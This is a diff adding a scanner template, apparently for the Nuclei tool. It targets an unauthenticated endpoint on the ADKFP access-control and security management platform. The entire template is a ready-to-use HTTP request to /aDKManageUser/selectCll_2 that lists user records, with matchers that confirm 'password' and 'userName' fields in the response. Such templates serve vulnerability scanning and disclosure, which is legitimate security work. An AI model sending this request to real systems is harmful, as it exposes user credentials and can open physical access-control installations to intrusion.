@@ -1,0 +1,35 @@
+id: ADKFP-aDKManageUser-weak
+info:
+  name: ADKFP-aDKManageUser-weak
+  author: apple
+  severity: high
+  description: ADKFP门禁出入口综合安防管理平台aDKManageUser文件存在未授权访问
+
+  reference:
+    - http://wiki.fofamini.com/2023hw/ADKFP%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0aDKManageUser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /aDKManageUser/selectCll_2?roleId=2&page=1&limit=10 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - password
+      - type: word
+        part: body
+        words:
+          - userName
